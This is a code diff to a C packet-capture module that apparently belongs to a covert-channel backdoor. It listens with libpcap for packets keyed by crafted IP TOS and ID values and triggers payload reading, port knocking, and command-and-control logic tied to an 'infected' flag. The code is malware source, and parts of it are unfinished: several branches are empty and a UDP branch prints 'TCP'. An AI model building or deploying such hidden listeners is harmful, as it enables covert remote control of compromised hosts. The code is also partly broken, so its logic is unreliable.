@@ -1,6 +1,6 @@
 #include "libpcap.h"
 
-int Packetcapture(char *filter, struct filter Filter){
+int Packetcapture(char *filter, struct filter Filter, bool udp){
     char errorbuffer[PCAP_ERRBUF_SIZE];
     struct bpf_program fp; //holds fp program info
     pcap_if_t *interface_list;
@@ -25,10 +25,15 @@ int Packetcapture(char *filter, struct filter Filter){
     if(pcap_setfilter(interfaceinfo, &fp) == -1){
         perror("pcap_setfilter");
     }
-
-    pcap_loop(interfaceinfo, -1, ReadPacket, (u_char*)&Filter);
+    if(udp){
+    pcap_loop(interfaceinfo, -1, ReadData, (u_char*)&Filter);
+    } else {
+    //pcap_loop(interfaceinfo, -1, ReadPacket, (u_char*)&Filter);
+    }
     return 0;
 }
+
+
 
 void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
     //grab the type of packet
@@ -41,6 +46,81 @@ void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pa
         ParseIP(Filter, pkthdr, packet);
     }
 }
+
+
+void ReadData(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
+    struct filter* Filter = NULL;
+    Filter = (struct filter *)args;
+    const struct my_ip* ip;
+    u_int length = pkthdr->len;
+    u_int hlen,off,version;
+    int len;
+
+    //skip past the ethernet header
+    ip = (struct my_ip*)(packet + sizeof(struct ether_header));
+    length-= sizeof(struct ether_header);
+
+    if(length < sizeof(struct my_ip)){
+        printf("Packet length is incorrect %d", length);
+        exit(1);
+    }
+    len = ntohs(ip->ip_len);
+    hlen = IP_HL(ip);
+    version = IP_V(ip);
+    off = ntohs(ip->ip_off);
+
+    if(version != 4){
+        perror("Unknown error");
+        exit(1);
+    } else if(hlen < 5){
+        perror("Bad header length");
+        exit(1);
+    } else if((int)length < len){
+        perror("Truncated IP");
+        exit(1);
+    } else if(ip->ip_p == IPPROTO_TCP){
+        printf("Protocal: TCP\n");
+        printf("IPID: %hu\n", ip->ip_id);
+        printf("TOS: %u\n", ip->ip_tos);
+        if(CheckKey(ip->ip_tos, ip->ip_id, false, true)){
+            printf("Reading payload\n");
+            ParseTCP(Filter, pkthdr, packet);
+        } else if(CheckKey(ip->ip_tos, ip->ip_id,true, true)) {
+            //change to port knocking
+            //ParsePattern(args,pkthdr, packet);
+            PortKnocking(Filter, pkthdr, packet, false);
+        } else {
+            printf("Packet tossed wrong key\n");
+        }
+    } else if(ip->ip_p == IPPROTO_UDP){
+        printf("Protocal: TCP\n");
+        printf("IPID: %hu\n", ip->ip_id);
+        printf("TOS: %u\n", ip->ip_tos);
+        printf("TTL: %u\n", ip->ip_ttl);
+        if(CheckKey(ip->ip_tos, ip->ip_id, false, false)){
+
+        } else if(CheckKey(ip->ip_tos, ip->ip_id, true, false)){
+
+        }
+        if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'r' && Filter->infected == false){
+            //CNC
+            //close loop end of results
+            printf("EXIT LOOP");
+            pcap_breakloop(interfaceinfo);
+        } else if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'r' && Filter->infected == true) {
+            //infected
+            //dont close
+            printf("EXIT LOOP");
+            pcap_breakloop(interfaceinfo);
+        } else if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'c' && Filter->infected == false){
+
+        } else if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'c' && Filter->infected == true){
+
+    }
+    }
+
+}
+
 void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet){
     const struct my_ip* ip;
     u_int length = pkthdr->len;
@@ -66,18 +146,17 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
     } else if(hlen < 5){
         perror("Bad header length");
         exit(1);
-    } else if(length < len){
+    } else if((int)length < len){
         perror("Truncated IP");
         exit(1);
     } else if(ip->ip_p == IPPROTO_TCP){
         printf("Protocal: TCP\n");
         printf("IPID: %hu\n", ip->ip_id);
         printf("TOS: %u\n", ip->ip_tos);
-        if(CheckKey(ip->ip_tos, ip->ip_id, false)){
+        if(CheckKey(ip->ip_tos, ip->ip_id, false, true)){
             printf("Reading payload\n");
             ParseTCP(Filter, pkthdr, packet);
-            ParseUDP(Filter, pkthdr, packet);
-        } else if(CheckKey(ip->ip_tos, ip->ip_id,true)) {
+        } else if(CheckKey(ip->ip_tos, ip->ip_id,true, true)) {
             //change to port knocking
             //ParsePattern(args,pkthdr, packet);
             PortKnocking(Filter, pkthdr, packet, false);
@@ -89,35 +168,67 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
         printf("IPID: %hu\n", ip->ip_id);
         printf("TOS: %u\n", ip->ip_tos);
         printf("TTL: %u\n", ip->ip_ttl);
-        if(ip->ip_id == 'x' && ip->ip_tos == 'x'){
+        if(CheckKey(ip->ip_tos, ip->ip_id, false, false)){
+
+        } else if(CheckKey(ip->ip_tos, ip->ip_id, true, false)){
+
+        }
+        if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'r' && Filter->infected == false){
+            //CNC
+            //close loop end of results
             printf("EXIT LOOP");
             pcap_breakloop(interfaceinfo);
-        }
-        ParseUDP(Filter, pkthdr, packet);
+        } else if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'r' && Filter->infected == true) {
+            //infected
+            //dont close
+            printf("EXIT LOOP");
+            pcap_breakloop(interfaceinfo);
+        } else if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'c' && Filter->infected == false){
+
+        } else if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'c' && Filter->infected == true){
 
     }
-
+    }
 }
 
-bool CheckKey(u_char ip_tos, u_short ip_id, bool knock){
-    if(knock){
-        //check if the key is right for port knocking
-        if(ip_tos == 'b' && ip_id == 'l'){
-            return true;
+bool CheckKey(u_char ip_tos, u_short ip_id, bool knock, bool tcp){
+    if(tcp){
+        if(knock){
+            //check if the key is right for port knocking
+            if(ip_tos == 'b' && ip_id == 'l'){
+                return true;
+            } else {
+                return false;
+            }
         } else {
-            return false;
+            // check if key is right for normal packets
+            if(ip_tos == 'l' && ip_id == 'b'){
+                return true;
+            } else {
+                return false;
+            }
         }
     } else {
-        // check if key is right for normal packets
-        if(ip_tos == 'l' && ip_id == 'b'){
-            return true;
+        if(knock){
+            //check if the key is right for port knocking
+            if(ip_tos == 'b' && ip_id == 'l'){
+                return true;
+            } else {
+                return false;
+            }
         } else {
-            return false;
-        }
+            // check if key is right for normal packets
+            if(ip_tos == 'l' && ip_id == 'b'){
+                return true;
+            } else {
+                return false;
+            }
+
+    }
     }
 }
 
-void ParseUDP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet){
+/*void ParseUDP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet){
     const struct sniff_tcp *udp=0;
     const struct my_ip *ip;
     const char *payload;
@@ -135,15 +246,15 @@ void ParseUDP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_c
 
     printf("Source port: %d\n", ntohs(udp->th_sport));
     printf("Destination port: %d\n", ntohs(udp->th_dport));
-    /*payload = (u_char *)(packet + 14 + size_ip + size_udp);
+    payload = (u_char *)(packet + 14 + size_ip + size_udp);
 
     size_payload = ntohs(ip->ip_len) - (size_ip + size_udp);
 
     if(size_payload > 0){
         printf("Payload (%d bytes):\n", size_payload);
         ParsePayload(Filter, payload, size_payload, false);
-    }*/
-}
+    }
+}*/
 
 void ParseTCP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet){
     const struct sniff_tcp *tcp=0;
@@ -241,7 +352,7 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tc
 }
 
 
-struct filter InitFilter(char *target, char *local){
+struct filter InitFilter(char *target, char *local, bool infected){
     struct filter Filter;
     Filter.amount = FILTERAMOUNT;
     Filter.port[0] = "8506";
@@ -252,6 +363,7 @@ struct filter InitFilter(char *target, char *local){
     Filter.port_short[1] = 8507;
     Filter.pattern[0] = 0;
     Filter.pattern[1] = 0;
+    Filter.infected = infected;
     strncpy(Filter.targetip, target, BUFFERSIZE);
     strncpy(Filter.localip, local, BUFFERSIZE);
     return Filter;
